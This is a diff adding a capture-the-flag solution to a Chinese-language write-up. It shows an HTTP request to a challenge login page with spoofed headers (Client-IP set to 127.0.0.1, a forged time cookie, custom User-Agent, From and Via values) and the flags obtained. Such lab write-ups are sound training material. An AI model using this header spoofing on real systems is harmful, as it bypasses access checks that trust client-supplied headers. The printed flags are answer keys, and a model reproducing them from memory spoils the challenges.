@@ -34,3 +34,18 @@ POST http://244a0b0a-7187-4c12-b732-c4c75557924b.node3.buuoj.cn/?s=captcha
 ```
 
 > flag{5c1565e5-6062-4416-b15a-75d3bc704bc6}
+
+## 假猪套天下第一
+
+> 题解
+
+```
+GET /L0g1n.php
+Cookie: PHPSESSID=29l41t2qh0buaagirh7tlqrsu6; time=253400544000
+Client-IP: 127.0.0.1
+User-Agent: Commodore 64
+from: root@gem-love.com
+via: y1ng.vip
+```
+
+> flag{d68b92d3-635a-492d-9411-8c603ba1561c}
